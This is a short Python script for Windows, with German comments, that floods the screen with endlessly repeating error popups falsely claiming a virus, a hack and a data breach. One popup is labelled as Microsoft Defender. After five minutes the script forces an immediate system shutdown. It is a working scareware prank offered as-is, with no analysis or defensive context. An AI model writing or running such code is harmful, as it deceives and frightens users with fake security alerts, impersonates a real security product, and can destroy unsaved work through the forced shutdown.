import ctypes
import time
import threading
import os

def popup_loop(title, message):
    while True:
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)  # 0x10 = Error Icon

# Pop-ups definieren
messages = [
    ("Warning!", "Your computer has a virus!"),
    ("System Alert", "You just got hacked 😈"),
    ("Critical Error", "Data breach detected!"),
    ("Security Notification", "Suspicious activity found on your machine."),
    ("Microsoft Defender", "Unauthorized access attempt blocked."),
]

# Starte Pop-ups in Threads
for title, message in messages:
    t = threading.Thread(target=popup_loop, args=(title, message), daemon=True)
    t.start()

# Nach 5 Minuten herunterfahren
time.sleep(5 * 60)
os.system("shutdown /s /t 0")
